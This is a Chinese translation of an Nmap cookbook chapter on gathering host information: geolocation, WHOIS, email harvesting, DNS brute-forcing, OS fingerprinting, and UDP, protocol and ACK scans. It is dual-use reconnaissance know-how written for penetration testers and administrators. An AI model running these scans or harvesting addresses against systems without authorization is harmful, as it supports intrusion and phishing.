# NMAP6 网络探索和安全审计秘籍（二）

> 原文：[`annas-archive.org/md5/0DC464DD8E91DC475CC40B74E4774B2B`](https://annas-archive.org/md5/0DC464DD8E91DC475CC40B74E4774B2B)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第三章：收集额外的主机信息

### 注意

本章向您展示了如何做一些在许多情况下可能是非法的、不道德的、违反服务条款的或只是不明智的事情。这里提供这些信息是为了让您了解如何保护自己免受威胁，并使自己的系统更加安全。在遵循这些说明之前，请确保您站在法律和道德的一边...运用您的力量为善！

在本章中，我们将涵盖：

+   对 IP 地址进行地理定位

+   从 WHOIS 记录中获取信息

+   检查主机是否已知存在恶意活动

+   收集有效的电子邮件帐户

+   发现指向相同 IP 地址的主机名

+   暴力破解 DNS 记录

+   对主机的操作系统进行指纹识别

+   发现 UDP 服务

+   列出远程主机支持的协议

+   通过使用 TCP ACK 扫描发现有状态的防火墙

+   将已知安全漏洞的服务进行匹配

+   欺骗端口扫描的源 IP

# 介绍

渗透测试中最重要的过程是信息收集阶段。在这个过程中，我们调查我们的目标，目标是了解一切。我们发现的信息可能在渗透测试的后续阶段非常宝贵。在这个过程中，我们收集信息，如用户名，可能的密码，额外的主机和服务，甚至版本标语，以及许多其他有趣的数据片段。

有几种工具可以帮助我们从许多不同的来源检索有关我们目标的信息。我们的成功来自于利用所有可用资源。敢于忽视或忽略其中任何一个，你可能会错过你完全 compromise 目标所需的信息。

Nmap 以其 OS 指纹识别、端口枚举和服务发现等信息收集能力而闻名，但由于 Nmap 脚本引擎的存在，现在可以执行一些新的信息收集任务，如对 IP 进行地理定位、检查主机是否进行恶意活动、暴力破解 DNS 记录以及使用 Google 收集有效的电子邮件帐户，等等。

在本章中，我将介绍一组 Nmap 选项和 NSE 脚本，用于查询 WHOIS 服务器，发现 UDP 服务，并将服务与公共安全漏洞进行匹配。

# 对 IP 地址进行地理定位

确定 IP 地址的位置有助于系统管理员在许多情况下，比如追踪攻击的来源、网络连接或者他们论坛中无害海报的来源。

Gorjan Petrovski 提交了三个 Nmap NSE 脚本，帮助我们对远程 IP 地址进行地理定位：`ip-geolocation-maxmind`，`ip-geolocation-ipinfodb`和`ip-geolocation-geobytes`。

这个配方将向您展示如何设置和使用 Nmap NSE 中包含的地理定位脚本。

## 准备工作

对于脚本 `ip-geolocation-maxmind` 需要一个外部数据库。从 [`geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz`](http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz ) 下载 Maxmind 的城市数据库，并将其提取到您的本地 Nmap 数据文件夹 `($NMAP_DATA/nselib/data/` )。

对于 *ip-geolocation-ipinfodb* 需要一个 API 密钥，因此您需要在 [`ipinfodb.com/register.php`](http://ipinfodb.com/register.php) 注册以获取它。与 Geobytes 不同，这项服务不会强加查询限制，因此我强烈建议获取您自己的 API 密钥以启用此脚本。

## 如何做...

打开终端并输入以下命令：

```
$nmap --script ip-geolocation-* <target>

```

您应该看到以下输出：

```
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
113/tcp closed ident

Host script results:
| ip-geolocation-geoplugin:
| 50.116.1.121 (0xdeadbeefcafe.com)
|   coordinates (lat,lon): 39.489898681641,-74.47730255127
|_  state: New Jersey, United States

Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds

```

## 它是如何工作的...

参数`--script ip-geolocation-*`告诉 Nmap 启动所有以`ip-geolocation-`开头的脚本。在撰写本文时，有三个地理位置脚本可用：`ip-geolocation-geoplugin`，`ip-geolocation-maxmind`和`ip-geolocation-ipinfodb`。有时服务提供商不会返回有关特定 IP 地址的任何信息，因此建议您尝试并比较所有结果。这些脚本返回的信息包括纬度和经度坐标，国家，州和城市（如有）。

## 还有更多...

请记住，`ip-geolocation-geoplugin`脚本通过查询免费公共服务来工作。在使用此脚本之前，请考虑您需要进行的查询数量，因为许多公共服务会对允许的查询数量设置限制。

人们普遍错误地认为 IP 到地理位置服务提供了计算机或设备的 100％位置。位置准确性在很大程度上取决于数据库，每个服务提供商可能使用不同的数据收集方法。在解释这些 NSE 脚本的结果时，请记住这一点。

### 提交新的地理位置提供商

如果您知道更好的 IP 到地理位置提供商，请毫不犹豫地将您自己的地理位置脚本提交给`nmap-dev`。不要忘记记录脚本是否需要外部 API 或数据库。如果您没有开发 Nmap 的经验，可以将您的想法添加到位于[`secwiki.org/w/Nmap/Script_Ideas.`](https://secwiki.org/w/Nmap/Script_Ideas.)的 NSE 脚本愿望清单中。

## 另请参阅

+   *从 WHOIS 记录获取信息*配方

+   *检查主机是否已知存在恶意活动*配方

+   *暴力破解 DNS 记录*配方

+   *收集有效的电子邮件帐户*配方

+   *发现指向相同 IP 地址的主机名*配方

+   *匹配已知安全漏洞的服务*配方

+   *欺骗端口扫描的源 IP*配方

+   在第八章中使用*Zenmap 生成网络拓扑图*配方，*生成扫描报告*

# 从 WHOIS 记录获取信息

**WHOIS**记录通常包含重要数据，如注册商名称和联系信息。系统管理员多年来一直在使用 WHOIS，尽管有许多可用于查询此协议的工具，但 Nmap 因其处理 IP 范围和主机名列表的能力而被证明是非常有价值的。

此配方将向您展示如何使用 Nmap 检索 IP 地址或域名的 WHOIS 记录。

## 如何做...

打开终端并输入以下命令：

```
$nmap --script whois <target>

```

输出将类似于以下内容：

```
$nmap --script whois scanme.nmap.org
Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.10s latency).
Not shown: 995 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
25/tcp   filtered smtp
80/tcp   open     http
646/tcp  filtered ldp
9929/tcp open     nping-echo

Host script results:
| whois: Record found at whois.arin.net
| netrange: 74.207.224.0 - 74.207.255.255
| netname: LINODE-US
| orgname: Linode
| orgid: LINOD
| country: US stateprov: NJ
|
| orgtechname: Linode Network Operations
|_orgtechemail: support@linode.com

```

## 它是如何工作的...

参数`--script whois`告诉 Nmap 查询区域 Internet 注册表的 WHOIS 数据库，以获取给定目标的记录。此脚本使用 IANA 的分配数据来选择 RIR，并将结果缓存到本地。或者，您可以覆盖此行为并选择要在参数`whodb`中使用的服务提供商的顺序：

```
$nmap --script whois --script-args whois.whodb=arin+ripe+afrinic <target>

```

该脚本将按顺序查询 WHOIS 提供商的列表，直到找到记录或引荐到记录为止。要忽略引荐记录，请使用值`nofollow` *:*

```
$nmap --script whois --script-args whois.whodb=nofollow <target>

```

## 还有更多...

要查询主机名列表（`-iL <input file>`）的 WHOIS 记录而不启动端口扫描（`-sn`），请输入以下 Nmap 命令：

```
$ nmap -sn --script whois -v -iL hosts.txt

```

输出将类似于以下内容：

```
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating Ping Scan at 14:20
Scanning 3 hosts [4 ports/host]
Completed Ping Scan at 14:20, 0.16s elapsed (3 total hosts)
Initiating Parallel DNS resolution of 3 hosts. at 14:20
Completed Parallel DNS resolution of 3 hosts. at 14:20, 0.20s elapsed
NSE: Script scanning 2 hosts.
Initiating NSE at 14:20
Completed NSE at 14:20, 1.13s elapsed
Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.10s latency).

Host script results:
| whois: Record found at whois.arin.net
| netrange: 74.207.224.0 - 74.207.255.255
| netname: LINODE-US
| orgname: Linode
| orgid: LINOD
| country: US stateprov: NJ
|
| orgtechname: Linode Network Operations
|_orgtechemail: support@linode.com

Nmap scan report for insecure.org (74.207.254.18)
Host is up (0.099s latency).
rDNS record for 74.207.254.18: web.insecure.org

Host script results:
|_whois: See the result for 74.207.244.221.

NSE: Script scanning 74.207.254.18.
Initiating NSE at 14:20
Completed NSE at 14:20, 0.00s elapsed
Nmap scan report for nmap.org (74.207.254.18)
Host is up (0.10s latency).
rDNS record for 74.207.254.18: web.insecure.org

Host script results:
|_whois: See the result for 74.207.244.221.

NSE: Script Post-scanning.
Read data files from: /usr/local/bin/../share/nmap
Nmap done: 3 IP addresses (3 hosts up) scanned in 1.96 seconds
 Raw packets sent: 12 (456B) | Rcvd: 3 (84B)

```

### 禁用缓存及其影响

有时，缓存响应将优先于查询 WHOIS 服务，这可能会阻止发现 IP 地址分配。要禁用缓存，您可以将脚本参数`whodb`设置为`nocache`：

```
$ nmap -sn --script whois --script-args whois.whodb=nocache scanme.nmap.org

```

与每个免费服务一样，我们需要考虑我们需要进行的查询数量，以避免达到每日限制并被禁止。

## 另请参阅

+   *定位 IP 地址*配方

+   *检查主机是否已知存在恶意活动*食谱

+   *暴力破解 DNS 记录*食谱

+   *收集有效的电子邮件帐户*食谱

+   *指纹识别主机的操作系统*食谱

+   *匹配已知安全漏洞的服务*食谱

+   *欺骗端口扫描的源 IP*食谱

+   第八章中的*使用 Zenmap 生成网络拓扑图*食谱，*生成扫描报告*

# 检查主机是否已知存在恶意活动

经常托管用户的系统管理员经常在监视其服务器免受恶意软件分发方面遇到困难。Nmap 允许我们系统地检查主机是否已知分发恶意软件或在钓鱼攻击中使用，同时从**Google 安全浏览**API 获得帮助。

此食谱向系统管理员展示如何检查主机是否已被 Google 的安全浏览服务标记为用于钓鱼攻击或分发恶意软件。

## 准备工作

`http-google-malware`脚本依赖于 Google 的安全浏览服务，并且需要您注册以获取 API 密钥。请在[`code.google.com/apis/safebrowsing/key_signup.html`](http://code.google.com/apis/safebrowsing/key_signup.html)注册。

## 如何做...

打开您喜欢的终端并键入：

```
$nmap -p80 --script http-google-malware --script-args http-google-malware.api=<API> <target>

```

该脚本将返回一条消息，指示服务器是否被 Google 的安全浏览标记为分发恶意软件或在钓鱼攻击中使用。

```
Nmap scan report for mertsssooopa.in (203.170.193.102)
Host is up (0.60s latency).
PORT   STATE SERVICE
80/tcp open  http
|_http-google-malware: Host is known for distributing malware.

```

## 工作原理...

`http-google-malware`脚本查询 Google 安全浏览服务，以确定主机是否被怀疑为恶意。此服务被 Mozilla Firefox 和 Google Chrome 等 Web 浏览器用于保护其用户，并且列表更新非常频繁。

```
# nmap -p80 --script http-google-malware -v scanme.nmap.org

```

输出将如下所示：

```
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating Ping Scan at 12:28
Scanning scanme.nmap.org (74.207.244.221) [4 ports]
Completed Ping Scan at 12:28, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:28
Completed Parallel DNS resolution of 1 host. at 12:28, 0.19s elapsed
Initiating SYN Stealth Scan at 12:28
Scanning scanme.nmap.org (74.207.244.221) [1 port]
Discovered open port 80/tcp on 74.207.244.221
Completed SYN Stealth Scan at 12:29, 0.26s elapsed (1 total ports)
NSE: Script scanning 74.207.244.221.
Initiating NSE at 12:29
Completed NSE at 12:29, 0.77s elapsed
Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.15s latency).
PORT   STATE SERVICE
80/tcp open  http
|_http-google-malware: Host is safe to browse.

```

## 还有更多...

如果您不想每次启动此脚本时都使用`http-google-malware.api`参数，可以编辑`http-google-malware.nse`文件，并将您的 API 密钥硬编码到脚本中。查找以下部分并将您的密钥存储在变量`APIKEY`中：

```
---#########################
--ENTER YOUR API KEY HERE  #
---#########################
local APIKEY = ""
---#########################
```

有关完整文档，请访问[`nmap.org/nsedoc/scripts/http-google-malware.html`](http://nmap.org/nsedoc/scripts/ http-google-malware.html)。

## 另请参阅

+   *对 IP 地址进行地理定位*食谱

+   *从 WHOIS 记录获取信息*食谱

+   *发现指向相同 IP 地址的主机名*食谱

+   *匹配已知安全漏洞的服务*食谱

+   *欺骗端口扫描的源 IP*食谱

+   *暴力破解 DNS 记录*食谱

+   *发现 UDP 服务*食谱

+   第八章中的*使用 Zenmap 生成网络拓扑图*食谱，*生成扫描报告*

# 收集有效的电子邮件帐户

有效的电子邮件帐户对于渗透测试人员非常有用，因为它们可以用于利用钓鱼攻击中的信任关系，对邮件服务器进行暴力密码审计，并用作许多 IT 系统中的用户名。

此食谱说明了如何使用 Nmap 获取有效的公共电子邮件帐户列表。

## 准备工作

`http-google-email`脚本未包含在 Nmap 的官方存储库中。因此，您需要从[`seclists.org/nmap-dev/2011/q3/att-401/http-google-email.nse`](http://seclists.org/nmap-dev/2011/q3/att-401/ http-google-email.nse )下载它并将其复制到本地脚本目录。复制`http-google-email.nse`后，您应该使用以下命令更新脚本数据库：

```
#nmap --script-updatedb

```

## 如何做...

打开您喜欢的终端并键入：

```
$nmap -p80 --script http-google-email,http-email-harvest <target>

```

您应该看到类似以下输出：

```
Nmap scan report for insecure.org (74.207.254.18)
Host is up (0.099s latency).
rDNS record for 74.207.254.18: web.insecure.org
PORT   STATE SERVICE
80/tcp open  http
| http-google-email:
|_fyodor@insecure.org
| http-email-harvest:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=insecure.org
|   root@fw.ginevra-ex.it
|   root@198.285.22.10
|   xi@x.7xdq
|   ross.anderson@cl.cam.ac.uk
|   rmh@debian.org
|   sales@insecure.com
|_  fyodor@insecure.org

```

## 工作原理...

Nmap 脚本引擎允许渗透测试人员以两种方式收集电子邮件：

+   Shinook 的`http-google-email`脚本使用 Google Web 和 Google Groups 搜索来查找属于给定域的公共电子邮件帐户。

+   Pattrik Karlsson 的`http-email-harvest`会爬取给定的 Web 服务器并提取找到的所有电子邮件地址。

参数`-p80 --script http-google-email,http-email-harvest`将端口扫描限制为端口 80，并启动先前提到的脚本，以尝试收集尽可能多的有效电子邮件帐户。

## 还有更多...

脚本`http-email-harvest`依赖于`httpspider`库，该库具有高度可定制性。例如，要允许蜘蛛爬行其他页面，请使用参数`httpspider.maxpagecount`：

```
$nmap -p80 --script http-email-harvest --script-args httpspider.maxpagecount=50 <target>

```

要从与根文件夹不同的页面开始爬行，请使用参数`httpspider.url`：

```
$nmap -p80 --script http-email-harvest --script-args httpspider.url=/welcome.php <target>

```

此库的官方文档可在[`nmap.org/nsedoc/lib/httpspider.html#script-args`](http://nmap.org/nsedoc/lib/httpspider.html#script-args)找到。

对于`http-google-email`，有一些值得知道的参数：

+   您可以通过使用脚本参数`domain`来指定要查找的域名*.*

```
$ nmap -p80 --script http-google-email --script-args domain=insecure.org scanme.nmap.org

```

+   通过增加脚本参数`pages`中的页面结果数量，您可能会获得额外的结果：

```
# nmap -p80 --script http-google-email --script-args pages=10 scanme.nmap.org

```

### NSE 脚本参数

标志`--script-args`用于设置 NSE 脚本的参数。例如，如果您想设置 HTTP 库参数`useragent`，请使用以下命令：

```
nmap -sV --script http-title --script-args http.useragent="Mozilla 999" <target>

```

在设置 NSE 脚本的参数时，您还可以使用别名。使用：

```
$nmap -p80 --script http-trace --script-args path <target>

```

而不是：

```
$nmap -p80 --script http-trace --script-args http-trace.path <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来设置不同的 HTTP UserAgent：

```
$nmap -p80 --script http-email-harvest --script-args http.useragent="Mozilla 42"

```

## 另请参阅

+   *使用额外的随机数据隐藏我们的流量*配方在第二章中，*网络探索*

+   *定位 IP 地址*配方

+   *从 WHOIS 记录中获取信息*配方

+   *指纹识别主机操作系统*配方

+   发现指向相同 IP 地址的主机名配方

+   *检查主机是否已知存在恶意活动*配方

+   *暴力破解 DNS 记录*配方

# 发现指向相同 IP 地址的主机名

Web 服务器根据 HTTP 请求中使用的主机名返回不同的内容。通过发现新的主机名，渗透测试人员可以访问以前使用服务器 IP 无法访问的新目标 Web 应用程序。

此配方显示了如何枚举指向相同 IP 的所有主机名，以发现新目标。

## 准备工作

脚本`hostmap`依赖于外部服务，官方版本仅支持 BFK 的 DNS 记录器。根据我的经验，这项服务对流行的服务器效果很好，但对其他服务器效果不佳。因此，我创建了自己的`hostmap.nse`版本，添加了一个新的服务提供商：[ip2hosts.com.](http://ip2hosts.com.)该服务使用必应的搜索 API，并经常返回 BFK 记录中没有的额外记录。

在[`secwiki.org/w/Nmap/External_Script_Library`](https://secwiki.org/w/Nmap/External_Script_Library)下载带有 Bing 支持的`hostmap.nse`。

将其复制到本地脚本目录后，通过运行以下命令更新您的脚本数据库：

```
#nmap --script-updatedb

```

## 操作方法...

打开终端，输入以下命令：

```
$nmap -p80 --script hostmap nmap.org

```

输出将类似于以下内容：

```
$nmap -p80 --script hostmap nmap.org
Nmap scan report for nmap.org (74.207.254.18)
Host is up (0.11s latency).
rDNS record for 74.207.254.18: web.insecure.org
PORT   STATE SERVICE
80/tcp open  http

Host script results:
| hostmap:
| sectools.org
| nmap.org
| insecure.org
| seclists.org
|_secwiki.org

```

## 它是如何工作的...

参数`--script hostmap -p80`告诉 Nmap 启动 HTTP 脚本 hostmap，并限制端口扫描到端口 80 以加快此任务的速度。

这个版本的`hostmap.nse`查询了两个不同的网络服务：BFK 的 DNS 记录器和[ip2hosts.com](http://ip2hosts.com)。BFK 的 DNS 记录器是一个免费服务，它从公共 DNS 数据中收集信息，而[ip2hosts.com](http://ip2hosts.com)是我维护的一个基于必应搜索 API 的网络服务。它基本上使用关键词“ip:<目标 ip>”启动必应搜索，以提取已知主机名列表。

这两项服务都是免费的，滥用它们很可能会导致您被该服务禁止使用。

## 还有更多...

您可以通过设置参数`hostmap.provider`来指定服务提供商：

```
$nmap -p80 --script hostmap --script-args hostmap.provider=BING <target>
$nmap -p80 --script hostmap --script-args hostmap.provider=BFK <target>
$nmap -p80 --script hostmap --script-args hostmap.provider=ALL <target>

```

要保存每个扫描的 IP 的主机名列表，请使用参数`hostmap.prefix`。设置此参数将在您的工作目录中创建一个文件，文件名为`<prefix><target>`：

```
$nmap -p80 --script hostmap --script-args hostmap.prefix=HOSTSFILE <target>

```

## 另请参阅

+   第二章中的*使用广播脚本收集网络信息*配方，*网络探索*

+   *定位 IP 地址*配方

+   *从 WHOIS 记录中获取信息*配方

+   *收集有效的电子邮件帐户*配方

+   *检查主机是否已知恶意活动*配方

+   *列出远程主机支持的协议*配方

+   *暴力破解 DNS 记录*配方

# 暴力破解 DNS 记录

DNS 记录包含了大量的主机信息。通过暴力破解它们，我们可以揭示额外的目标。此外，DNS 条目通常会泄露信息，例如“mail”表明我们显然正在处理邮件服务器，或者 Cloudflare 的默认 DNS 条目“direct”，大多数情况下将指向他们试图保护的 IP。

此配方显示如何使用 Nmap 暴力破解 DNS 记录。

## 如何做...

打开终端并输入：

```
#nmap --script dns-brute <target>

```

如果成功，结果应包括找到的 DNS 记录列表：

```
# nmap --script dns-brute host.com

Nmap scan report for host.com (XXX.XXX.XXX.XXX)
Host is up (0.092s latency).
Other addresses for host.com (not scanned): YYY.YY.YYY.YY ZZ.ZZZ.ZZZ.ZZ
Not shown: 998 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Host script results:
| dns-brute:
|   DNS Brute-force hostnames
|     www.host.com – AAA.AA.AAA.AAA
|     www.host.com – BB.BBB.BBB.BBB
|     www.host.com – CCC.CCC.CCC.CC
|     www.host.com – DDD.DDD.DDD.D
|     mail.host.com – EEE.AA.EEE.AA
|     ns1.host.com – AAA.EEE.AAA.EEE
|     ns1.host.com – ZZZ.III.ZZZ.III
|     ns2.host.com – ZZZ.III.XXX.XX
|     direct.host.com – YYY.YY.YYY.YY
|_    ftp.host.com – ZZZ.ZZZ.ZZZ.ZZ

```

## 它是如何工作的...

参数`--script dns-brute`启动 NSE 脚本`dns-brute`。

`dns-brute`由 Cirrus 开发，它试图通过暴力破解目标的 DNS 记录来发现新的主机名。该脚本基本上通过主机名列表进行迭代，检查 DNS 条目是否存在以找到有效记录。

这种暴力破解攻击很容易被安全机制检测到，因为它监视 NXDOMAIN 响应。

## 还有更多...

`dns-brute`使用的默认字典是硬编码在本地脚本文件夹`/scripts/dns-brute.nse`中的 NSE 文件中的。要使用自己的字典文件，请使用参数`dns-brute.hostlist`：

```
$nmap --script dns-brute --script-args dns-brute.hostlist=words.txt <target>

```

要设置线程数，请使用参数`dns-brute.threads`：

```
$nmap --script dns-brute --script-args dns-brute.threads=8 <target>

```

您可以使用`--dns-servers <serv1[,serv2],...>`设置不同的 DNS 服务器：

```
$ nmap --dns-servers 8.8.8.8,8.8.4.4 scanme.nmap.org

```

### 目标库

参数`--script-args=newtargets`强制 Nmap 使用找到的新主机作为目标：

```
#nmap --script dns-brute --script-args newtargets

```

输出将类似于以下内容：

```
$nmap -sP --script dns-brute --script-args newtargets host.com

Nmap scan report for host.com (<IP removed>)
Host is up (0.089s latency).
Other addresses for host.com (not scanned): <IP removed> <IP removed> <IP removed> <IP removed>
rDNS record for <IP removed>: <id>.cloudflare.com

Host script results:
| dns-brute:
|   DNS Brute-force hostnames
|     www.host.com - <IP removed>
|     www.host.com - <IP removed>
|     www.host.com - <IP removed>
|     www.host.com - <IP removed>
|     mail.host.com - <IP removed>
|     ns1.host.com - <IP removed>
|     ns1.host.com - <IP removed>
|     ns2.host.com - <IP removed>
|     ftp.host.com - <IP removed>
|_    direct.host.com - <IP removed>

Nmap scan report for mail.host.com (<IP removed>)
Host is up (0.17s latency).

Nmap scan report for ns1.host.com (<IP removed>)
Host is up (0.17s latency).
Other addresses for ns1.host.com (not scanned): <IP removed>

Nmap scan report for ns2.host.com (<IP removed>)
Host is up (0.17s latency).

Nmap scan report for direct.host.com (<IP removed>)
Host is up (0.17s latency).

Nmap done: 7 IP addresses (6 hosts up) scanned in 21.85 seconds

```

请注意，当我们启动扫描时只指定了一个目标，但`newtargets`参数添加了新的 IP 到扫描队列中。

参数`max-newtargets`设置允许添加到扫描队列的主机的最大数量：

```
#nmap --script dns-brute --script-args max-newtargets=3

```

## 另请参阅

+   *远程主机的指纹服务*配方在第一章中，*Nmap 基础知识*

+   *定位 IP 地址*配方

+   *收集有效的电子邮件地址*配方

+   *从 WHOIS 记录中获取信息*配方

+   *发现指向相同 IP 地址的主机名*配方

+   *欺骗端口扫描的源 IP*配方

+   *发现 UDP 服务*配方

# 指纹识别主机的操作系统

确定主机的操作系统对于每个渗透测试人员都是至关重要的，原因包括列出可能的安全漏洞，确定可用的系统调用以设置特定的利用负载，以及许多其他依赖于操作系统的任务。Nmap 以拥有最全面的 OS 指纹数据库和功能而闻名。

此配方显示如何使用 Nmap 对远程主机的操作系统进行指纹识别。

## 如何做...

打开终端并输入以下内容：

```
#nmap -O <target>

```

输出将类似于以下内容：

```
# nmap -O scanme.nmap.org
Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.12s latency).
Not shown: 995 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
25/tcp   filtered smtp
80/tcp   open     http
646/tcp  filtered ldp
9929/tcp open     nping-echo
Device type: general purpose
Running (JUST GUESSING): Linux 2.6.X (87%)
OS CPE: cpe:/o:linux:kernel:2.6.38
Aggressive OS guesses: Linux 2.6.38 (87%), Linux 2.6.34 (87%), Linux 2.6.39 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 8 hops

OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.69 seconds

```

## 它是如何工作的...

选项`-O`告诉 Nmap 启用 OS 检测。由于其用户社区的贡献，Nmap 的 OS 检测非常强大，可以识别各种系统，包括家用路由器、IP 网络摄像头、操作系统和许多其他硬件设备。

Nmap 进行了几项测试，试图确定目标的操作系统。完整的文档可以在[`nmap.org/book/osdetect-methods.html`](http://nmap.org/book/osdetect-methods.html)找到。

操作系统检测需要原始数据包，并且 Nmap 需要足够的权限来创建这些数据包。

## 还有更多...

Nmap 使用**CPE**（**通用平台枚举**）作为服务和操作系统检测的命名方案。这种约定在信息安全行业中用于识别软件包、平台和系统。

如果操作系统检测失败，您可以使用参数`--osscan-guess`来尝试猜测操作系统：

```
#nmap -O -p- --osscan-guess <target>

```

要仅在扫描条件理想时启动操作系统检测，请使用参数`--osscan-limit`：

```
#nmap -O --osscan-limit <target>

```

### 详细模式下的操作系统检测

尝试在详细模式下进行操作系统检测，以查看额外的主机信息，例如用于空闲扫描的 IP ID 序列号：

```
#nmap -O -v <target>

```

### 提交新的操作系统指纹

当您可以通过提交未知的操作系统或设备来为项目做出贡献时，Nmap 会通知您。

我鼓励您为这个项目做出贡献，因为 Nmap 的检测能力直接来自它的数据库。请访问[`insecure.org/cgi-bin/submit.cgi?new-os`](http://insecure.org/cgi-bin/submit.cgi?new-os)提交新的指纹。

## 另请参阅

+   *列出远程主机上的开放端口*配方第一章，*Nmap 基础知识*

+   *远程主机的指纹服务*配方第一章，*Nmap 基础知识*

+   *扫描 IPv6 地址*配方第二章，*网络探索*

+   *列出远程主机支持的协议*配方

+   *将已知安全漏洞的服务与匹配*配方

+   *欺骗端口扫描的源 IP*配方

+   *暴力破解 DNS 记录*配方

+   *使用 TCP ACK 扫描发现有状态防火墙*配方

+   *发现 UDP 服务*配方

# 发现 UDP 服务

在渗透测试中通常会忽略 UDP 服务，但优秀的渗透测试人员知道它们经常会透露重要的主机信息，甚至可能会有漏洞并被用于入侵主机。

此配方展示了如何使用 Nmap 列出主机上所有开放的 UDP 端口。

## 如何做...

打开您的终端并键入：

```
#nmap -sU -p- <target>

```

输出遵循 Nmap 的标准格式：

```
# nmap -sU -F scanme.nmap.org

Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.100s latency).
Not shown: 98 closed ports
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
123/udp open          ntp

```

## 它是如何工作的...

参数`-sU`告诉 Nmap 对目标主机进行*UDP 扫描*。Nmap 发送 UDP 探测到选定的端口，并分析响应以确定端口的状态。Nmap 的*UDP 扫描技术*工作方式如下：

1.  除非在文件`nmap-payloads`中指定了 UDP 负载，否则将向目标发送一个空的 UDP 数据包。

1.  如果端口关闭，则从目标接收到一个 ICMP 端口不可达的消息。

1.  如果端口打开，则接收 UDP 数据。

1.  如果端口根本没有响应，我们假设端口状态为`filtered|open`。

## 还有更多...

由于操作系统施加的传输速率限制了每秒响应的数量，UDP 扫描速度较慢。此外，防火墙主机阻止 ICMP 将丢弃端口不可达消息。这使得 Nmap 难以区分关闭和过滤的端口，并导致重传，使得此扫描技术变得更慢。如果您需要对 UDP 服务进行清点并且时间紧迫，那么事先考虑这一点非常重要。

### 端口选择

因为 UDP 扫描可能非常慢，建议您使用标志`-p`进行端口选择：

```
#nmap -p1-500 -sU <target>

```

别名`-F`也可以用于快速端口扫描：

```
#nmap -F -sU <target>

```

## 另请参阅

+   *远程主机的指纹服务*配方第一章，*Nmap 基础知识*

+   *从 WHOIS 记录中获取信息*配方

+   *指纹识别主机的操作系统*配方

+   *发现指向相同 IP 地址的主机名*配方

+   *列出远程主机支持的协议*配方

+   *将已知安全漏洞的服务与匹配*配方

+   *欺骗端口扫描的源 IP*配方

+   *暴力破解 DNS 记录*配方

# 列出远程主机支持的协议

**IP 协议扫描**对于确定主机正在使用哪些通信协议非常有用。这些信息有不同的用途，包括数据包过滤测试和远程操作系统指纹识别。

此配方显示了如何使用 Nmap 枚举主机支持的所有 IP 协议。

## 如何做...

打开终端并输入以下命令：

```
$nmap -sO <target>

```

结果将显示支持的协议以及它们的状态。

```
# nmap -sO 192.168.1.254

Nmap scan report for 192.168.1.254
Host is up (0.0021s latency).
Not shown: 253 open|filtered protocols
PROTOCOL STATE  SERVICE
1        open   icmp
6        open   tcp
132      closed sctp
MAC Address: 5C:4C:A9:F2:DC:7C (Huawei Device Co.)

Nmap done: 1 IP address (1 host up) scanned in 3.67 seconds

```

## 工作原理...

标志`-sO`告诉 Nmap 执行 IP 协议扫描。这种类型的扫描遍历文件`nmap-protocols`中找到的协议，并为每个条目创建 IP 数据包。对于 TCP、ICMP、UDP、IGMP 和 SCTP 协议，Nmap 将设置有效的标头值，但对于其余的协议，将使用一个空的 IP 数据包。

要确定协议状态，Nmap 将接收到的不同响应分类如下：

+   如果收到 ICMP 协议不可达错误类型 3 代码 2，则将协议标记为关闭

+   ICMP 不可达错误类型 3 代码 1,3,9,10 或 13 表示协议被过滤

+   如果没有收到响应，则协议被标记为`filtered|open`

+   任何其他响应都会导致协议被标记为打开

## 还有更多...

要指定应该扫描哪些协议，我们可以设置参数`-p`：

```
$nmap -p1,3,5 -sO <target>
$nmap -p1-10 -sO <target>

```

### 自定义 IP 协议扫描

包含 IP 协议列表的文件名为`nmap-protocols`，位于 Nmap 安装的根文件夹中。要添加新的 IP 协议，我们只需要将其条目添加到这个文件中：

```
#echo "hip 139 #Host Identity Protocol" >> /usr/local/share/nmap/nmap-protocols

```

## 另请参阅

+   *指纹识别主机操作系统*配方

+   *发现指向相同 IP 地址的主机名*配方

+   *匹配已知安全漏洞的服务*配方

+   *欺骗端口扫描的源 IP*配方

+   *暴力破解 DNS 记录*配方

+   *使用 TCP ACK 发现有状态防火墙* *扫描*配方

+   *发现 UDP 服务*配方

# 通过使用 TCP ACK 扫描发现有状态防火墙

**TCP ACK 扫描技术**使用带有 ACK 标志的数据包来尝试确定端口是否被过滤。当检查保护主机的防火墙是有状态的还是无状态的时，这种技术非常方便。

此配方显示了如何使用 Nmap 执行 TCP ACK 端口扫描。

## 如何做...

打开您的终端并输入以下命令：

```
#nmap -sA <target>
```

输出遵循标准端口格式：

```
# nmap -sA 192.168.1.254

Nmap scan report for 192.168.1.254
Host is up (0.024s latency).
All 1000 scanned ports on 192.168.1.254 are unfiltered
MAC Address: 5C:4C:A9:F2:DC:7C (Huawei Device Co.)

```

## 工作原理...

参数`-sA`告诉 Nmap 对目标主机执行*TCP ACK 端口扫描*。TCP ACK 端口扫描技术的工作方式如下：

1.  带有 ACK 标志的数据包被发送到每个选定的端口。

1.  如果端口是打开或关闭，目标机器会发送一个 RST 数据包。这个响应也表明目标主机没有在有状态的防火墙后面。

